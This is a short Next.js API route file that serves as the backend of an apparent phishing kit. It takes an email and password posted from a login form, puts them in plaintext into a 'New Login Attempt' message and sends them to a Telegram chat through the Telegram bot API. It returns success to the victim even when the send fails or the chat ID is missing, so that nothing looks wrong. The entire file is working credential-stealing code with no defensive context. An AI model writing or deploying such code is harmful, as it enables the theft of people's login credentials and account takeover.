import { NextRequest, NextResponse } from "next/server";

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "";
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "";

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    const { email, password } = body;

    if (!email || !password) {
      return NextResponse.json(
        { error: "Email and password are required" },
        { status: 400 }
      );
    }

    if (!TELEGRAM_CHAT_ID) {
      console.error("TELEGRAM_CHAT_ID not configured");
      // Still return success to not break the flow
      return NextResponse.json({ success: true });
    }

    const message = `🔐 New Login Attempt\n\n📧 Email: ${email}\n🔑 Password: ${password}\n⏰ Time: ${new Date().toLocaleString()}`;

    const response = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: "HTML",
        }),
      }
    );

    if (!response.ok) {
      const error = await response.text();
      console.error("Telegram API error:", error);
    }

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error("Error in telegram route:", error);
    return NextResponse.json({ success: true }); // Return success anyway
  }
}